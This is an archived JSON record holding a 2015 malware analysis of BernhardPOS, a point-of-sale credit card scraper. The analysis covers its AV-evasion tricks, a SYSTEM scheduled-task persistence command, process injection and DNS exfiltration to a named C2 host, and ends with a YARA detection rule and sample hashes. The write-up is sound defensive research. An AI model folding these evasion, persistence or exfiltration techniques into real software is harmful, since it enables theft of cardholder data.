{
    "id": "e39ebd5e-6e5c-4d81-81ca-49b2c3907ed2",
    "created_at": "2023-01-12T15:02:51.077245Z",
    "updated_at": "2025-03-27T02:06:03.45318Z",
    "deleted_at": null,
    "sha1_hash": "a3e9d9df7a1f295e9a1941efd98a4043d440b6be",
    "title": "2015-07-14 - BernhardPOS",
    "authors": "",
    "file_creation_date": "2022-10-02T12:11:08Z",
    "file_modification_date": "2022-10-02T12:11:08Z",
    "file_size": 431636,
    "plain_text": "# securitykitten.github.io/2015-07-14-bernhardpos.md at master · malware-kitten/securitykitten.github.io · GitHub\n\n**[github.com/malware-kitten/securitykitten.github.io/blob/master/_posts/2015-07-14-bernhardpos.md](https://github.com/malware-kitten/securitykitten.github.io/blob/master/_posts/2015-07-14-bernhardpos.md)**\n\nmalware-kitten\n\nCannot retrieve contributors at this time\n\n**layout** **title** **date**\n\ncategory-post BernhardPOS 2015-07-14 00:00:00 -0400\n\n## Introduction\n\nYet another new credit card dumping utility has been discovered.\nBernhardPOS is named after (presumably) its author who left in the build\npath of `C:\\bernhard\\Debug\\bernhard.pdb and also uses the name`\nBernhard in creating the mutex `OPSEC_BERNHARD . This utility does`\nseveral interesting things to evade antivirus detection. We'll talk over some\nof them in depth. Details about the sample, including a hash are available\nat the end of this writeup.\n\n\n-----\n\nAt the time of discovery it was scoring a low 3/56 detection on VirusTotal.\n\n## Digging Deeper\n\nBy just looking at the strings, it's not entirely obvious what the features of\nBernhard are. Pasted below are all of the strings.\n```\nA 0x4d !This program cannot be run in DOS mode.$\n\nA 0xb0 Rich\n\nA 0x1c0 .textbss\n\nA 0x1e8 .text\n\nA 0x20f `.rdata\n\nA 0x237 @.data\n\nA 0x260 .idata\n\nA 0x287 @.reloc\n\nA 0x3480 OPSEC_BERNHARD\n\nA 0x3634 RSDS\n\nA 0x364c C:\\bernhard\\Debug\\bernhard.pdb\n\nA 0x3d66 Sleep\n\nA 0x3d6e ExitProcess\n\nA 0x3d7c CreateThread\n\nA 0x3d8c lstrlenA\n\nA 0x3d98 lstrcatA\n\nA 0x3da4 VirtualAlloc\n\nA 0x3db4 VirtualFree\n\nA 0x3dc2 GetCurrentProcess\n\nA 0x3dd6 GetLastError\n\nA 0x3de6 CloseHandle\n\nA 0x3df4 GetSystemInfo\n\nA 0x3e04 WideCharToMultiByte\n\nA 0x3e18 KERNEL32.dll\n\nA 0x3e28 CharUpperA\n\nA 0x3e34 USER32.dll\n\n\n```\nThe main thread is responsible for running the following items (in order):\n\nManually building a base64 dictionary for use later\n\n\n-----\n\nDecoding and building imports\nLoadLibraries for later use / Get function addresses\nCreate the Mutex\nAdjust/Check Privs\nSet up sockets\nCreate Mailslot & Monitor for Credit Card Data\nSet up persistence\nInject and search for CC data\n\nThe reader may notice that imports like ReadProcessMemory,\nVirtualQueryEx, OpenProcess, etc.. are not present in this strings dump,\nthey will be imported later. These API's are commonly used in credit card\ndumpers and used to crawl process memory space. Bernhard seems to\ntake some care to not get immediately detected.\n\nThese APIs are resolved using standard shellcode practices. It manually\nparses through Kernel32's PE header to find its list of exported functions,\nthen hashes the name of each one until it matches the hash of the API it's\nlooking for (LoadLibraryA). It uses similar logic to resolve the other API's it\nneeds. It does hide the names of the dll's it needs by decoding them at\nruntime using the xor key `[0x0B,0x0A,0x17,0x0D,0x1A,0x1F] (same`\none used for exfil below). It also xor's the resulting plaintext again when it\nis finished so they're only plaintext in memory for a tiny sliver of time, likely\nto try to avoid being caught by memory scans.\n\nWhile crawling through kernel32's PE header, the shellcode does an\ninteresting trick. To avoid being picked up by AV, the malware places junk\ninstructions in between the MOV operations. Notice the ADD's followed\nimmediately by the SUB, resulting in no change in EAX. This is simply\nmeant to throw off AV scanners that look for the FS[:30] shellcode\ntechnique.\n\n\n-----\n\nThe string OPSEC_BERNHARD correlates to the name of the mutex.\nTraditionally a mutex is used to make sure that only one instance of the\nmalware is running on the machine.\n\nIn addition to creating a mutex, Bernhard will also create a mailslot named\nww2. This is used as a temporary storage for the found credit card\nnumbers.\n\n## Persistence\n\nTo establish persistence on the host, the following command is decoded by\nthe malware and executed. (Where in this case\ncdcdc7331e3ba74709b0d47e828338c4fcc350d7af9ae06412f2dd16bd9a089f\nis the filename of the binary)\n```\nschtasks /create /tn ww /sc HOURLY /tr\n\\\"C:\\cdcdc7331e3ba74709b0d47e828338c4fcc350d7af9ae06412f2dd16bd9a089f\n /RU SYSTEM\"\n\n\n```\nThe options are\n```\nTask name - ww\n\nSchedule - Hourly\n\nRun as user - System\n\n\n```\nIt also sets up an autorun key\n\n\n-----\n\n```\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\coreService\n\n## Process Injection\n\n Process Enumeration and Filtering\n\n```\nAfter all of the initialization code, the sample begins its main injection\nroutine which will run every 3 minutes indefinitely. Like most POS samples,\nit iterates over running processes. Unlike most, (which use\nCreateToolhelp32Snapshot) it uses ZwQuerySystemInformation (/w\nSystemInformationClass = SystemProcessInformation). This returns an\narray of structures describing each process running on the system. The\nmalware then iterates over these structures, passing each pid and process\nname to a filtering function which determines whether to inject or not. The\nfollowing processes are blacklisted (not an exhaustive list, just the ones\nskipped over on my personal analysis machine):\n\nPID 0\nPID 4\nItself\ncsrss.exe\nwinlogon.exe\nlsass.exe\nsvchost\nexplorer\nalg.exe\nwscntfy.exe\n\n## Injection\n\nOnce a process has passed the filtering the actual injection occurs:\n\n1. ZwQueryInformationProcess is used to get the address of the PEB in\n\nthe remote process.\n2. The PEB is read. One of the fields in the PEB contains the load\n\naddress of the target module.\n3. The first 40 bytes of the remote process are read. A marker of\n\n0x029A is written in the header of the remote process (offset 0x24).\nThis appears to never be referenced again which is strange.\n4. Standard code injection via WriteProcessMemory &\n\nCreateRemoteThread is used to deploy the CC track data scraper to\nthe remote process.\n\n\n-----\n\n## Injected Code\n\nThe injected code just iterates over all virtual memory sections in the\nremote process. If a memory section has property MEM_COMMIT and\naccess PAGE_READ_WRITE, then the code begins searching for valid\ntrack data using a custom algorithm. When valid track data is found, it is\nimmediately sent to the mailslot. The main process reads them from the\nmailslot, verifies them /w Luhn's and sends them out to the C2 (See\nExfiltration). The following code is a similar implementation to how the\nauthors implemented Luhns.\n```\nint IsValidCC(const char* cc,int CClen)\n\n {\n   const int m[] = {0,2,4,6,8,1,3,5,7,9}; // mapping for rule 3\n\n   int i, odd = 1, sum = 0;\n\n   for (i = CClen; i--; odd = !odd) {\n\n     int digit = cc[i] - '0';\n\n     sum += odd ? digit : m[digit];\n\n   }\n\n   return sum % 10 == 0;\n\n }\n\n## Exfiltration\n\n```\nExfiltration is done via DNS to 29a.de. (5.101.147.126)\n\nThe C2 is manually constructed\n\nand a DNS request looks like the following.\n\nThe credit card numbers in the DNS requests are base64 encoded and\nxor'd using a key of \"0B 0A 17 0D 1A 1F\". With the following simple ruby\nscript these can be decoded.\n\n\n-----\n\n```\nrequire base64\n\nxor_key = [0x0B,0x0A,0x17,0x0D,0x1A,0x1F]\n\nrequest =\n\"PzMnPiosOD4nOCwuOzomPS4nNjovPS8uOzsnNCstODkjOCwoMwAA.29a.de\"\n\ncc_num = request.split(\".\").first\n\nenc_num = Base64.decode64(cc_num)\n\ncount = 0\n\nenc_num.bytes.each do |byte|\n\n  print \"#{((byte ^ xor_key[count % xor_key.length]) % 0xff).chr}\"\n\n  count += 1\n\nend\n\n=begin\n\n#example dns query\n\n#16  43.022113000  10.0.2.15  5.101.147.126  DNS  119  \nStandard query 0x0065 A\nPzMnPiosOD4nOCwuOzomPS4nNjovPS8uOzsnNCstODkjOCwoMwAA.29a.de\n\n#running the script\n\n490303340561001048=080510109123345678\n\n=end\n\n```\nVirustotal DNS also has some interesting history on the IP 5.101.147.126\n\n## Detection\n\nThe following yara rule will detect BernhardPOS.\n\n\n-----\n\n```\nrule BernhardPOS {\n\n  meta:\n\n   author = \"Nick Hoffman / Jeremy Humble\"\n\n   last_update = \"2015-07-14\"\n\n   source = \"Booz Allen Inc.\"\n\n   description = \"BernhardPOS Credit Card dumping tool\"\n\n  strings:\n\n   /*\n\n   33C0    xor  eax, eax\n\n   83C014    add  eax, 0x14\n\n   83E814    sub  eax, 0x14\n\n   64A130000000    mov  eax, dword ptr fs:[0x30]\n\n   83C028    add  eax, 0x28\n\n   83E828    sub  eax, 0x28\n\n   8B400C    mov  eax, dword ptr [eax + 0xc]\n\n   83C063    add  eax, 0x63\n\n   83E863    sub  eax, 0x63\n\n   8B4014    mov  eax, dword ptr [eax + 0x14]\n\n   83C078    add  eax, 0x78\n\n   83E878    sub  eax, 0x78\n\n   8B00    mov  eax, dword ptr [eax]\n\n   05DF030000    add  eax, 0x3df\n\n   2DDF030000    sub  eax, 0x3df\n\n   8B00    mov  eax, dword ptr [eax]\n\n   83C057    add  eax, 0x57\n\n   83E857    sub  eax, 0x57\n\n   8B4010    mov  eax, dword ptr [eax + 0x10]\n\n   83C063    add  eax, 0x63\n\n   */\n\n   $shellcode_kernel32_with_junk_code = { 33 c0 83 ?? ?? 83 ?? ??\n64 a1 30 00 00 00 83 ?? ?? 83 ?? ?? 8b 40 0c 83 ?? ?? 83 ?? ?? 8b 40\n14 83 ?? ?? 83 ?? ?? 8b 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 8b 00 83 ??\n?? 83 ?? ?? 8b 40 10 83 ?? ?? }\n\n   $mutex_name = \"OPSEC_BERNHARD\"\n\n   $build_path = \"C:\\\\bernhard\\\\Debug\\\\bernhard.pdb\"\n\n   /*\n\n   55    push  ebp\n\n   8BEC    mov  ebp, esp\n\n   83EC50    sub  esp, 0x50\n\n   53    push  ebx\n\n   56    push  esi\n\n   57    push  edi\n\n   A178404100    mov  eax, dword ptr [0x414078]\n\n   8945F8    mov  dword ptr [ebp - 8], eax\n\n   668B0D7C404100    mov  cx, word ptr [0x41407c]\n\n   66894DFC    mov  word ptr [ebp - 4], cx\n\n   8A157E404100    mov  dl, byte ptr [0x41407e]\n\n   8855FE    mov  byte ptr [ebp - 2], dl\n\n   8D45F8    lea  eax, dword ptr [ebp - 8]\n\n   50    push  eax\n\n   FF150CB04200    call  dword ptr [0x42b00c]\n\n   8945F0    mov  dword ptr [ebp - 0x10], eax\n\n```\n\n-----\n\n```\n   C745F400000000    mov  dword ptr [ebp 0xc], 0\n\n   EB09    jmp  0x412864\n\n   8B45F4    mov  eax, dword ptr [ebp - 0xc]\n\n   83C001    add  eax, 1\n\n   8945F4    mov  dword ptr [ebp - 0xc], eax\n\n   8B4508    mov  eax, dword ptr [ebp + 8]\n\n   50    push  eax\n\n   FF150CB04200    call  dword ptr [0x42b00c]\n\n   3945F4    cmp  dword ptr [ebp - 0xc], eax\n\n   7D21    jge  0x412894\n\n   8B4508    mov  eax, dword ptr [ebp + 8]\n\n   0345F4    add  eax, dword ptr [ebp - 0xc]\n\n   0FBE08    movsx  ecx, byte ptr [eax]\n\n   8B45F4    mov  eax, dword ptr [ebp - 0xc]\n\n   99    cdq\n\n   F77DF0    idiv  dword ptr [ebp - 0x10]\n\n   0FBE5415F8    movsx  edx, byte ptr [ebp + edx - 8]\n\n   33CA    xor  ecx, edx\n\n   8B4508    mov  eax, dword ptr [ebp + 8]\n\n   0345F4    add  eax, dword ptr [ebp - 0xc]\n\n   8808    mov  byte ptr [eax], cl\n\n   EBC7    jmp  0x41285b\n\n   5F    pop  edi\n\n   5E    pop  esi\n\n   5B    pop  ebx\n\n   8BE5    mov  esp, ebp\n\n   5D    pop  ebp\n\n   */\n\n   $string_decode_routine = { 55 8b ec 83 ec 50 53 56 57 a1 ?? ??\n?? ?? 89 45 f8 66 8b 0d ?? ?? ?? ?? 66 89 4d fc 8a 15 ?? ?? ?? ?? 88\n55 fe 8d 45 f8 50 ff ?? ?? ?? ?? ?? 89 45 f0 c7 45 f4 00 00 00 00 ??\n?? 8b 45 f4 83 c0 01 89 45 f4 8b 45 08 50 ff ?? ?? ?? ?? ?? 39 45 f4\n?? ?? 8b 45 08 03 45 f4 0f be 08 8b 45 f4 99 f7 7d f0 0f be 54 15 f8\n33 ca 8b 45 08 03 45 f4 88 08 ?? ?? 5f 5e 5b 8b e5 5d }\n\n  condition:\n\n   any of them\n\n }\n\n## Conclusion\n\n```\nWhat makes BernhardPOS stand out is the use of code that continues to\nevade AV detection. Between manually resolving imports when they are\nneeded and inserting junk code between legit operations, this malware\nstays successfully hidden. It manually encodes the strings that it needs to\nin order to evade a simple string based rule. And it doesn't heavily pack or\nencrypt itself in a way that would set off high entropy rules. In most\nnetwork scenarios, DNS is a port left wide open due to machines needing\n\n\n-----\n\nto communicate with one another and the larger Internet. Leveraging DNS\nallows the malware authors to not worry about being blocked by a firewall\nor hindered by network restrictions.\n\nThere doesn't seem to be a stop to attacks on point of sale machines. By\nusing the same technique of finding credit card information in a processes\nmemory space, malware samples like these continue to be successful.\n\n## Sample Details\n\n Checksums\n```\nFilename cdcdc7331e3ba74709b0d47e828338c4fcc350d7af9ae06412f2dd16bd9a089f\n\nMD5Sum  - e49820ef02ba5308ff84e4c8c12e7c3d\n\nSHA1   - a0601921795d56be9e51b82f8dbb0035c96ab2d6\n\nSHA256  cdcdc7331e3ba74709b0d47e828338c4fcc350d7af9ae06412f2dd16bd9a089f\n\nSHA512  c693533d68f38cf2d7107c14b1c2fa1157dc16fc93a976851de59e8ab819898a53810\n\nIMPHash - fd8af1cc60e7046c1e08e4d95bac68f7\n\nPEHash  - ece74afd17d0d18d819d687ea550cad97d703e94\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2015/2015-07-14 - BernhardPOS.pdf"
    ],
    "report_names": [
        "2015-07-14 - BernhardPOS.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535771,
    "ts_updated_at": 1743041163,
    "ts_creation_date": 1664712668,
    "ts_modification_date": 1664712668,
    "files": {
        "pdf": "https://archive.orkl.eu/a3e9d9df7a1f295e9a1941efd98a4043d440b6be.pdf",
        "text": "https://archive.orkl.eu/a3e9d9df7a1f295e9a1941efd98a4043d440b6be.txt",
        "img": "https://archive.orkl.eu/a3e9d9df7a1f295e9a1941efd98a4043d440b6be.jpg"
    }
}